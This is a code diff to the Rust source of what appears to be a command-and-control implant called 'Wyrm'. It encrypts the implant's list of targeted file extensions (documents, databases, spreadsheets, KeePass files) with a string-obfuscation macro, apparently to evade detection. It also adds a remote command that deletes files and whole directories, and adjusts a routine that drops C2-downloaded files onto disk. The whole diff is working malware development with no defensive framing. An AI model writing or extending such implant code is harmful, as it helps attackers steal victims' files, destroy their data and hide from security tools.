@@ -8,6 +8,7 @@ use serde::Serialize;
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
 use shared::tasks::{ExfiltratedFile, FileDropMetadata, WyrmResult};
+use str_crypter::{decrypt_string, sc};
 
 use crate::{
     comms::download_file_with_uri_in_memory,
@@ -65,23 +66,23 @@ fn get_file_listings_from_dir_and_subdirs(
                     let ext = path.extension().unwrap_or_default();
                     let ext = ext.to_str().unwrap_or_default();
 
-                    if ext.eq_ignore_ascii_case("pdf") || 
-                        ext.eq_ignore_ascii_case("doc") || 
-                        ext.eq_ignore_ascii_case("docx") || 
+                    if ext.eq_ignore_ascii_case(&sc!("pdf", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("doc", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("docx", 56).unwrap()) || 
                         // ext.eq_ignore_ascii_case("txt") || 
-                        ext.eq_ignore_ascii_case("log") || 
-                        ext.eq_ignore_ascii_case("png") || 
-                        ext.eq_ignore_ascii_case("mov") || 
-                        ext.eq_ignore_ascii_case("kpdb") || 
-                        ext.eq_ignore_ascii_case("xls") || 
-                        ext.eq_ignore_ascii_case("xlsx") || 
-                        ext.eq_ignore_ascii_case("ppt") || 
-                        ext.eq_ignore_ascii_case("pptx") ||
-                        ext.eq_ignore_ascii_case("sql") ||
-                        ext.eq_ignore_ascii_case("sqlite3") ||
-                        ext.eq_ignore_ascii_case("accdb") ||
-                        ext.eq_ignore_ascii_case("csv") ||
-                        ext.eq_ignore_ascii_case("db")
+                        ext.eq_ignore_ascii_case(&sc!("log", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("png", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("mov", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("kpdb", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("xls", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("xlsx", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("ppt", 56).unwrap()) || 
+                        ext.eq_ignore_ascii_case(&sc!("pptx", 56).unwrap()) ||
+                        ext.eq_ignore_ascii_case(&sc!("sql", 56).unwrap()) ||
+                        ext.eq_ignore_ascii_case(&sc!("sqlite3", 56).unwrap()) ||
+                        ext.eq_ignore_ascii_case(&sc!("accdb", 56).unwrap()) ||
+                        ext.eq_ignore_ascii_case(&sc!("csv", 56).unwrap()) ||
+                        ext.eq_ignore_ascii_case(&sc!("db", 56).unwrap())
                     {
                         let s = path.to_string_lossy().to_string();
                         listings.push(s);
@@ -127,7 +128,7 @@ pub enum MoveCopyAction {
 }
 
 /// Implementation for copying or moving a file from location a to b.
-/// .
+///
 /// The function takes a [`MoveCopyAction`] which determines whether the function moves or copies a file
 pub fn move_or_copy_file(
     implant: &Wyrm,
@@ -198,6 +199,47 @@ pub fn move_or_copy_file(
     }
 }
 
+pub fn rm_from_fs(
+    implant: &Wyrm,
+    metadata: &str,
+    target_type: PathParseType,
+) -> Option<impl Serialize + use<>> {
+    let from = match serde_json::from_str::<String>(&metadata) {
+        Ok(v) => v,
+        Err(e) => return Some(WyrmResult::Err::<String>(e.to_string())),
+    };
+
+    let from_path = match parse_path(&from, &implant.current_working_directory, target_type) {
+        WyrmResult::Ok(p) => p,
+        WyrmResult::Err(e) => return Some(WyrmResult::Err(e)),
+    };
+
+    match target_type {
+        PathParseType::Directory => {
+            if let Err(e) = fs::remove_dir_all(from_path) {
+                return Some(WyrmResult::Err(format!(
+                    "{} {}",
+                    sc!("Error removing directory:", 69).unwrap(),
+                    e.to_string()
+                )));
+            }
+        }
+        PathParseType::File => {
+            if let Err(e) = fs::remove_file(from_path) {
+                return Some(WyrmResult::Err(format!(
+                    "{} {}",
+                    sc!("Error removing file:", 68).unwrap(),
+                    e.to_string()
+                )));
+            }
+        }
+    }
+
+    Some(WyrmResult::Ok(
+        sc!("Operation completed successfully", 146).unwrap(),
+    ))
+}
+
 /// Drops a file to the disk in the current directory from the C2.
 pub fn drop_file_to_disk(
     metadata_str: &Option<String>,
@@ -208,10 +250,7 @@ pub fn drop_file_to_disk(
         None => return None,
     };
 
-    let metadata = match FileDropMetadata::try_from(metadata_str.as_str()) {
-        Ok(m) => m,
-        Err(e) => return Some(WyrmResult::Err(e.to_string())),
-    };
+    let metadata = FileDropMetadata::from(metadata_str.as_str());
 
     // Note: The download uri should be guaranteed here, so an unwrap is acceptable
     let file_data = match download_file_with_uri_in_memory(&metadata.download_uri.unwrap(), wyrm) {
@@ -292,8 +331,8 @@ pub fn change_directory(
     }
 }
 
-#[derive(PartialEq, Eq)]
-enum PathParseType {
+#[derive(PartialEq, Eq, Copy, Clone)]
+pub enum PathParseType {
     Directory,
     File,
 }
